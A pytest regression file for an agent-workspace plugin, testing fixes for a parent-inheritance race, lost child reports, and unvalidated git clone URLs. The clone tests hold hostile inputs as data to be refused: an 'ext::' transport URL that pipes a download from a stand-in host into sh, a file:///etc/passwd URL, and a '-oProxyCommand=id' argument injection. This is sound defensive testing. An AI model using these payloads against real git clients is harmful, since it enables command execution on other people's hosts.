"""Wave A: the three P1 defects the behavioural raid found.

One file, three defects, one rule: each test names the failure it prevents
and FAILS on the code it was written against. A regression test that passes
on the broken code is a test that proves nothing.
"""

from __future__ import annotations

import sys
import types

import pytest
from plugin_loader import GATE, PLUGIN, STORE


def _fake_child_context(monkeypatch, value: bool = True):
    """The host's task-local 'this session is a delegated child' flag."""
    mod = types.ModuleType("agent.delegation_context")
    mod.is_delegated_child_context = lambda: value
    monkeypatch.setitem(sys.modules, "agent.delegation_context", mod)


class _FakeTap:
    """A stand-in for a Telegram callback query, and the update around it.

    WHY a class and not a mock: the picker handler only touches
    ``callback_query.data``, ``.from_user``, ``.answer()`` and
    ``.edit_message_text()``, and the tests need to see what the handler
    ANSWERED and EDITED - that is where the confirmation button lives.
    """

    def __init__(self, data: str):
        self.data = data
        self.from_user = None
        self.answered: list[str] = []
        self.edited: list[dict] = []

    async def answer(self, text=None, show_alert=False):
        self.answered.append(str(text))

    async def edit_message_text(self, text=None, reply_markup=None):
        self.edited.append({"text": text, "markup": reply_markup})


class _FakeUpdate:
    """The update wrapper the picker handler reads the chat from."""

    def __init__(self, tap: _FakeTap):
        self.callback_query = tap
        self.effective_chat = type("Chat", (), {"id": -1001})()
        self.effective_message = type("Msg", (), {"message_thread_id": None})()


def _tap(choice: str, token: str) -> tuple[_FakeTap, _FakeUpdate]:
    tap = _FakeTap(f"ws:{token}:{choice}")
    return tap, _FakeUpdate(tap)


def _fake_telegram(monkeypatch):
    """Stand in for python-telegram-bot, which is not in the test env.

    The picker builds its keyboard with ``telegram.InlineKeyboardButton`` /
    ``InlineKeyboardMarkup``. Those are dumb data holders, so a stand-in that
    records what it was given is enough to prove the CONFIRMATION BUTTON
    exists and what it says.
    """
    mod = types.ModuleType("telegram")

    class InlineKeyboardButton:
        def __init__(self, text, callback_data=None, **kw):
            self.text = text
            self.callback_data = callback_data

    class InlineKeyboardMarkup:
        def __init__(self, inline_keyboard, **kw):
            self.inline_keyboard = inline_keyboard

    mod.InlineKeyboardButton = InlineKeyboardButton
    mod.InlineKeyboardMarkup = InlineKeyboardMarkup
    monkeypatch.setitem(sys.modules, "telegram", mod)
    return mod


# ── P1-1: the cross-parent inheritance race ────────────────────────────────


def test_two_concurrent_delegations_do_not_cross_inherit(state_home, tmp_path, monkeypatch):
    """Two children dispatched concurrently must each get THEIR OWN parent.

    Prevents (P1-1): the plugin kept "the sid of the most recent
    delegate_task dispatch" in a MODULE GLOBAL and read it back when a
    child's first gated call arrived. A global can only ever name ONE
    parent, so with two delegations in flight the second dispatch
    overwrote the first: child A then resolved its parent as B, and
    ``ensure_child_workspace`` built A's workspace inside B's repo with B's
    parent stamped as ``inherited_from``. Two agents, two trees, one of them
    in the wrong repository.

    The interleaving here is the one that breaks it: BOTH dispatches happen
    BEFORE either child's first gated call.
    """
    _fake_child_context(monkeypatch)

    repo_a = tmp_path / "repo-a"
    repo_b = tmp_path / "repo-b"
    for repo in (repo_a, repo_b):
        repo.mkdir()
    STORE.write_state("parent-A", {
        "mode": "repo", "repo": "repo-a", "slug": "pa", "path": str(repo_a)})
    STORE.write_state("parent-B", {
        "mode": "repo", "repo": "repo-b", "slug": "pb", "path": str(repo_b)})

    # The host's subagent_start hook fires for each child as it is built,
    # naming BOTH the parent and the child. That is the per-child channel.
    PLUGIN._on_subagent_start(parent_session_id="parent-A", child_session_id="child-A")
    PLUGIN._on_subagent_start(parent_session_id="parent-B", child_session_id="child-B")

    # Both parents dispatch, back to back, and NEITHER child has made its
    # first gated call yet. This is the window the global was wrong in.
    for parent in ("parent-A", "parent-B"):
        res = PLUGIN._on_pre_tool_call(tool_name="delegate_task", session_id=parent)
        assert res is None, res

    seen: dict[str, dict] = {}

    def fake_ensure(sid, parent_state, **kw):
        seen[sid] = dict(parent_state)
        return {"ok": True, "reason": "", "repo": str(parent_state.get("repo") or ""),
                "slug": "child", "path": str(tmp_path / "ws" / sid)}

    monkeypatch.setattr(PLUGIN.childspace, "ensure_child_workspace", fake_ensure)

    # Child A's first gated call.
    res = PLUGIN._on_pre_tool_call(tool_name="terminal", session_id="child-A")
    assert res is None, res
    # Child B's first gated call.
    res = PLUGIN._on_pre_tool_call(tool_name="terminal", session_id="child-B")
    assert res is None, res

    assert seen.get("child-A", {}).get("repo") == "repo-a", (
        "child A built its workspace in the WRONG repo - it inherited child B's parent"
    )
    assert seen.get("child-B", {}).get("repo") == "repo-b", (
        "child B built its workspace in the WRONG repo"
    )


def test_a_child_never_guesses_a_parent_it_cannot_resolve(state_home, tmp_path, monkeypatch):
    """A child whose parent cannot be resolved is BLOCKED, not guessed.

    Prevents (P1-1, second half): the fix for the cross-parent race must not
    reintroduce the guess. A process-global recency tracker is exactly the
    "guess" that caused the race, so a child with no per-child parent record
    gets refused - a blocked child is recoverable, a child silently editing
    a stranger's tree is not.
    """
    _fake_child_context(monkeypatch)
    repo = tmp_path / "repo"
    repo.mkdir()
    STORE.write_state("parent-A", {
        "mode": "repo", "repo": "repo", "slug": "pa", "path": str(repo)})

    # No child_runs row for this child: the plugin was enabled mid-delegation.
    calls: list[str] = []
    monkeypatch.setattr(
        PLUGIN.childspace, "ensure_child_workspace",
        lambda sid, parent_state, **kw: calls.append(sid) or {"ok": True, "path": "/x"},
    )

    res = PLUGIN._on_pre_tool_call(tool_name="terminal", session_id="orphan-child")
    assert res is not None and res["action"] == "block", (
        "a child with no resolvable parent must be blocked, not given a guess"
    )
    assert not calls, "the child was handed a parent it never had"


def test_the_parent_is_resolved_from_a_per_child_channel_only(state_home, tmp_path, monkeypatch):
    """The parent comes from the child's OWN row - there is no global left.

    Prevents (P1-1): the fix has to remove the module global, not merely
    shadow it. A global that still exists is a global that a future reader
    will use again - and the same race comes back with it.
    """
    assert not hasattr(PLUGIN, "_LAST_DELEGATION"), (
        "the module-global delegation pointer must be GONE - it is what let two "
        "concurrent delegations inherit each other's parent"
    )


def test_a_child_finds_its_parent_in_its_own_binding_row(state_home, tmp_path, monkeypatch):
    """The child's own binding row is the fallback channel.

    Prevents: a child whose ``subagent_start`` row is missing (the plugin was
    enabled while the child was already running) would have no parent at all,
    and the gate would block a legitimate child.
    """
    repo = tmp_path / "repo"
    repo.mkdir()
    STORE.write_state("parent-A", {
        "mode": "repo", "repo": "repo", "slug": "pa", "path": str(repo)})
    STORE.write_state("child-A", {
        "mode": "repo", "repo": "repo", "slug": "ca", "path": str(repo),
        "parent_session_id": "parent-A", "inherited_from": "parent-A"})

    assert GATE._resolve_child_parent("child-A") == "parent-A"


def test_the_child_run_row_wins_over_the_binding_row(state_home):
    """The dispatch-time record is authoritative.

    Prevents: a re-dispatched child keeps an OLD ``inherited_from`` in its
    binding row while the new dispatch wrote a new ``child_runs`` row. The
    newer record must win, or the child goes back to its previous parent.
    """
    STORE.write_state("child-A", {
        "mode": "repo", "repo": "repo", "slug": "ca", "path": "/x",
        "parent_session_id": "parent-OLD", "inherited_from": "parent-OLD"})
    STORE.db.write_child_run("child-A", "parent-NEW")

    assert GATE._resolve_child_parent("child-A") == "parent-NEW"


# ── P1-2: the report lost on re-dispatch ───────────────────────────────────


def test_a_report_rewritten_between_the_read_and_the_clear_survives(state_home):
    """A report that arrives AFTER the parent read must not be destroyed.

    Prevents (P1-2): the delivery reads the pending reports, renders them,
    and then deletes them BY CHILD ID. The report row's primary key is the
    child session id, and the child's report thread REWRITES that row in
    place when the child is re-dispatched. A rewrite landing between the
    read and the delete therefore shared the id and was deleted - a report
    the parent had never seen, silently gone. The parent lost the child's
    end state, which is the whole point of the report.

    The interleaving here is the one that breaks it: read -> rewrite ->
    clear.
    """
    STORE.db.write_child_report(
        "child-A", "parent-A", child_status="completed", workspace_slug="old-run")

    # The parent's turn: read the pending reports.
    reports = PLUGIN.childreport.take_pending_reports("parent-A")
    assert len(reports) == 1, reports

    # The child is re-dispatched and finishes again BEFORE the parent clears.
    STORE.db.write_child_report(
        "child-A", "parent-A", child_status="completed", workspace_slug="new-run")

    # The parent clears what it rendered.
    PLUGIN.childreport.clear_delivered_reports(reports)

    # The NEWER report must still be pending: the parent never saw it.
    pending = STORE.db.read_child_reports("parent-A")
    assert len(pending) == 1, (
        "the newer report was destroyed by a delete that only knew the child id"
    )
    assert pending[0]["workspace_slug"] == "new-run", pending


def test_the_delivered_report_is_still_cleared(state_home):
    """The fix must not make every report permanent.

    Prevents: a version-scoped delete that never matches would leave every
    report pending, and the parent would see the same child line on every
    turn forever.
    """
    STORE.db.write_child_report(
        "child-A", "parent-A", child_status="completed", workspace_slug="run-1")
    reports = PLUGIN.childreport.take_pending_reports("parent-A")
    assert len(reports) == 1, reports
    assert PLUGIN.childreport.clear_delivered_reports(reports) == 1
    assert STORE.db.read_child_reports("parent-A") == [], (
        "the delivered report was not cleared - it would repeat every turn"
    )


def test_a_report_rewritten_and_delivered_is_delivered_once(state_home):
    """The versioned path delivers the new report on the next turn.

    Prevents: the fix could easily make the NEW report permanent instead -
    the parent never learns what the re-dispatched child left behind.
    """
    STORE.db.write_child_report(
        "child-A", "parent-A", child_status="completed", workspace_slug="old-run")
    first = PLUGIN.childreport.take_pending_reports("parent-A")
    STORE.db.write_child_report(
        "child-A", "parent-A", child_status="completed", workspace_slug="new-run")
    PLUGIN.childreport.clear_delivered_reports(first)

    second = PLUGIN.childreport.take_pending_reports("parent-A")
    assert len(second) == 1, second
    assert second[0]["workspace_slug"] == "new-run", second
    PLUGIN.childreport.clear_delivered_reports(second)
    assert STORE.db.read_child_reports("parent-A") == []


def test_two_children_are_cleared_independently(state_home):
    """Clearing one child's report must not touch another's.

    Prevents: a delete scoped to "the reports I read" that accidentally
    matched every row for the parent - one child's delivery wiping another
    child's pending report.
    """
    STORE.db.write_child_report(
        "child-A", "parent-A", child_status="completed", workspace_slug="a")
    STORE.db.write_child_report(
        "child-B", "parent-A", child_status="completed", workspace_slug="b")
    reports = PLUGIN.childreport.take_pending_reports("parent-A")
    assert len(reports) == 2, reports

    only_a = [r for r in reports if r["child_session_id"] == "child-A"]
    PLUGIN.childreport.clear_delivered_reports(only_a)

    pending = STORE.db.read_child_reports("parent-A")
    assert [r["child_session_id"] for r in pending] == ["child-B"], pending


# ── P1-3: the picker's unvalidated clone ────────────────────────────────────


def test_a_command_execution_url_is_refused(state_home, tmp_path, monkeypatch):
    """A clone URL that names a git transport helper must never be cloned.

    Prevents (P1-3): the clone URL comes from a remote catalogue response
    (the Forgejo API). git and jj both support "transport helper" URLs -
    ``ext::sh -c '...'`` makes the clone RUN A COMMAND. A hostile or
    compromised forge could therefore get arbitrary command execution on
    this host by answering the catalogue with one of those URLs.
    """
    clone_root = tmp_path / "clones"
    clone_root.mkdir()
    monkeypatch.setattr(STORE, "clone_root", lambda: clone_root)
    monkeypatch.setattr(STORE, "find_repo", lambda name: (_ for _ in ()).throw(
        STORE.WorkspaceError("no repo")))

    ran: list[list[str]] = []
    monkeypatch.setattr(STORE, "run", lambda cmd, cwd=None: ran.append(cmd) or "")

    for bad in (
        "ext::sh -c 'curl http://evil/x | sh'",
        "ext::sh -c id",
        "file:///etc/passwd",
        "git://example.com/repo.git",
        "http://example.com/repo.git",
    ):
        with pytest.raises(STORE.WorkspaceError):
            STORE.ensure_local("evil", bad)
    assert not ran, f"a clone was started with an unvalidated URL: {ran}"


def test_the_allowlist_accepts_https_and_ssh(state_home, tmp_path, monkeypatch):
    """The two schemes a real git host uses must still work.

    Prevents: a fix that refuses everything would look safe and break every
    clone.
    """
    clone_root = tmp_path / "clones"
    clone_root.mkdir()
    monkeypatch.setattr(STORE, "clone_root", lambda: clone_root)
    monkeypatch.setattr(STORE, "find_repo", lambda name: (_ for _ in ()).throw(
        STORE.WorkspaceError("no repo")))

    ran: list[list[str]] = []
    monkeypatch.setattr(STORE, "run", lambda cmd, cwd=None: ran.append(cmd) or "")
    monkeypatch.setattr(STORE, "clone_repo", lambda name, url: STORE.clone_root() / name)

    STORE.ensure_local("ok", "https://forge.example/owner/repo.git")
    STORE.ensure_local("ok2", "ssh://git@forge.example/owner/repo.git")
    assert len(ran) == 2, ran


def test_a_url_without_a_scheme_or_host_is_refused(state_home):
    """A half-written URL is not a URL.

    Prevents: ``https://`` with no host is a local path in disguise, and a
    bare path would be cloned relative to the clone root.
    """
    for bad in ("https://", "ssh://", "/etc/passwd", "not a url", "-oProxyCommand=id"):
        with pytest.raises(STORE.WorkspaceError):
            STORE.validate_clone_url("repo", bad)


def test_the_picker_never_clones_without_a_confirmation_tap(state_home, tmp_path, monkeypatch):
    """Tapping a repo that is not on disk must NOT clone it.

    Prevents (P1-3, second half): the picker's repo tap called
    ``ensure_local()`` directly, which CLONES as a side effect - with the
    raw ``clone_url`` from the catalogue, and without asking. Cloning
    writes to the user's disk, so it needs the user's approval: the tap
    must only show a confirmation button, and the clone happens on the
    confirm tap.

    The scheme allowlist alone does not cover this: an https:// URL from a
    hostile forge is still a clone the user never approved.
    """
    import asyncio

    clone_root = tmp_path / "clones"
    clone_root.mkdir()
    monkeypatch.setattr(STORE, "clone_root", lambda: clone_root)
    monkeypatch.setattr(STORE, "find_repo", lambda name: (_ for _ in ()).throw(
        STORE.WorkspaceError("no repo")))

    cloned: list[tuple[str, str]] = []

    def fake_ensure_local(name, url):
        cloned.append((name, url))
        return clone_root / name

    monkeypatch.setattr(STORE, "ensure_local", fake_ensure_local)
    monkeypatch.setattr(STORE, "create", lambda repo, slug, purpose="": {
        "repo": repo, "slug": slug, "path": str(clone_root / repo / slug), "vcs": "jj"})

    entry = {"name": "evil", "url": "https://forge.example/owner/evil.git",
             "source": "forgejo", "owner": "owner"}
    token = STORE.new_token([entry], session_id="sid-pick")
    STORE.write_state("sid-pick", {"mode": "chatting"})
    _fake_telegram(monkeypatch)

    tap, update = _tap("0", token)
    asyncio.run(PLUGIN.telegram_picker._on_choice_callback(update, None))

    assert not cloned, f"the picker cloned without a confirmation tap: {cloned}"
    assert tap.edited, "the picker did not ask for a clone confirmation"
    markup = tap.edited[-1]["markup"]
    labels = [b.text for row in markup.inline_keyboard for b in row]
    assert any("clone" in str(t).lower() for t in labels), labels
    # The confirmation button must name the repo and the forge it comes
    # from, so the user knows what they are approving.
    assert any("evil" in str(t) for t in labels), labels
    assert any("forgejo" in str(t) for t in labels), labels


def test_the_confirmation_tap_clones(state_home, tmp_path, monkeypatch):
    """The confirm tap is what clones - and it goes through the allowlist.

    Prevents: a confirm button that does nothing (the user approves and
    nothing happens), and a confirm path that skips the scheme check.
    """
    import asyncio

    clone_root = tmp_path / "clones"
    clone_root.mkdir()
    monkeypatch.setattr(STORE, "clone_root", lambda: clone_root)
    monkeypatch.setattr(STORE, "find_repo", lambda name: (_ for _ in ()).throw(
        STORE.WorkspaceError("no repo")))

    ran: list[list[str]] = []
    monkeypatch.setattr(STORE, "run", lambda cmd, cwd=None: ran.append(cmd) or "")
    monkeypatch.setattr(STORE, "create", lambda repo, slug, purpose="": {
        "repo": repo, "slug": slug, "path": str(clone_root / repo / slug), "vcs": "jj"})

    entry = {"name": "okrepo", "url": "https://forge.example/owner/okrepo.git",
             "source": "forgejo", "owner": "owner"}
    token = STORE.new_token([entry], session_id="sid-confirm", kind="clone")
    STORE.write_state("sid-confirm", {"mode": "chatting"})

    _, update = _tap("clone", token)
    asyncio.run(PLUGIN.telegram_picker._on_choice_callback(update, None))

    assert ran, "the confirmation tap did not clone"
    assert "https://forge.example/owner/okrepo.git" in ran[0], ran


def test_a_pick_token_cannot_be_replayed_as_a_clone_approval(state_home, tmp_path, monkeypatch):
    """The clone confirmation needs its own token.

    Prevents: a "pick" token (the repo list keyboard) being replayed as a
    clone approval - the approval is meant to be a deliberate second tap.
    """
    import asyncio

    clone_root = tmp_path / "clones"
    clone_root.mkdir()
    monkeypatch.setattr(STORE, "clone_root", lambda: clone_root)
    monkeypatch.setattr(STORE, "find_repo", lambda name: (_ for _ in ()).throw(
        STORE.WorkspaceError("no repo")))

    ran: list[list[str]] = []
    monkeypatch.setattr(STORE, "run", lambda cmd, cwd=None: ran.append(cmd) or "")

    entry = {"name": "okrepo", "url": "https://forge.example/owner/okrepo.git",
             "source": "forgejo", "owner": "owner"}
    # A token of the PICK kind, tapped as if it were the clone button.
    token = STORE.new_token([entry], session_id="sid-replay")
    STORE.write_state("sid-replay", {"mode": "chatting"})

    _, update = _tap("clone", token)
    asyncio.run(PLUGIN.telegram_picker._on_choice_callback(update, None))

    assert not ran, f"a pick token cloned a repo: {ran}"


# ── the schema migration the report_seq fix needs ──────────────────────────


def test_an_old_database_gains_the_report_seq_column(state_home, tmp_path, monkeypatch):
    """The live install's database predates report_seq - it must get it.

    Prevents (P1-2, migration half): the versioned delete needs the column,
    and the live database was created before it existed. A CREATE TABLE IF
    NOT EXISTS cannot add a column to a table that is already there, so the
    migration has to ALTER the table - and it has to do it on open, without
    losing the rows that are already in it.
    """
    import sqlite3

    path = tmp_path / "plugin-data" / "data.db"
    path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(path)
    conn.executescript("""
    CREATE TABLE child_reports (
        child_session_id TEXT PRIMARY KEY,
        parent_session_id TEXT NOT NULL DEFAULT '',
        child_role       TEXT NOT NULL DEFAULT '',
        child_status     TEXT NOT NULL DEFAULT '',
        workspace_path   TEXT NOT NULL DEFAULT '',
        workspace_slug   TEXT NOT NULL DEFAULT '',
        workspace_repo   TEXT NOT NULL DEFAULT '',
        dirty            TEXT NOT NULL DEFAULT 'unknown',
        unpushed         INTEGER,
        created_at       TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE bindings (
        session_id       TEXT PRIMARY KEY,
        mode             TEXT,
        repo             TEXT,
        slug             TEXT,
        path             TEXT,
        title            TEXT,
        inherited_from   TEXT,
        inherited_at     TEXT,
        session_ended_at TEXT,
        updated_at       TEXT,
        extra            TEXT NOT NULL DEFAULT '{}',
        payload          TEXT NOT NULL DEFAULT '{}'
    );
    CREATE TABLE kv (
        key        TEXT PRIMARY KEY,
        value      TEXT NOT NULL DEFAULT '',
        updated_at TEXT
    );
    INSERT INTO child_reports(child_session_id, parent_session_id, child_status)
      VALUES('old-child', 'old-parent', 'completed');
    """)
    conn.commit()
    conn.close()

    monkeypatch.setenv("HERMES_TREEPS_PLUGIN_DATA_DIR", str(path.parent))
    monkeypatch.setenv("HERMES_TREEPS_DB_PATH", str(path))
    STORE.db.reset()
    try:
        rows = STORE.db.read_child_reports("old-parent")
        cols = [
            r[1]
            for r in sqlite3.connect(path).execute("PRAGMA table_info(child_reports)")
        ]
        assert "report_seq" in cols, (
            f"the old database did not gain report_seq: {cols}"
        )
        assert len(rows) == 1, "the migration lost a pending report"
        assert rows[0]["report_seq"] == 0, rows[0]
    finally:
        STORE.db.reset()
